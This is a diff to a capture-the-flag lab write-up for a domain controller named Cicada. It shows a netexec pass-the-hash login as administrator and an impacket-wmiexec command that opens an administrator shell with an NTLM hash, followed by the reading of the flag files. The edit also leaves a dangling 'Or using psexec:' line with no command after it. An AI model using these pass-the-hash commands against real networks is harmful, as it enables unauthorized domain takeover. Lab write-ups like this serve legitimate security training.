@@ -228,22 +228,18 @@ netexec smb dc-jpq225.cicada.vl -u administrator -H 85a0da53871a9d56b6cd05deda3a
 # [+] cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 (Pwn3d!)
 ```
 
-### Get Shell
+###For a full interactive shell as Administrator:
 
 ```bash
-wmiexec.py cicada.vl/administrator@dc-jpq225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
+impacket-wmiexec -k -hashes 'aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87' cicada.vl/Administrator@DC-JPQ225.cicada.vl
+Or using psexec:
 ```
 
-### Capture Flags
-
 ```cmd
-C:\> whoami
-cicada\administrator
-
-C:\users\administrator\desktop> type user.txt
+C:\> cd Users\Administrator\Desktop
+C:\Users\Administrator\Desktop> type user.txt
 c6a8fc2e************************
-
-C:\users\administrator\desktop> type root.txt
+C:\Users\Administrator\Desktop> type root.txt
 65d0019f************************
 ```
 
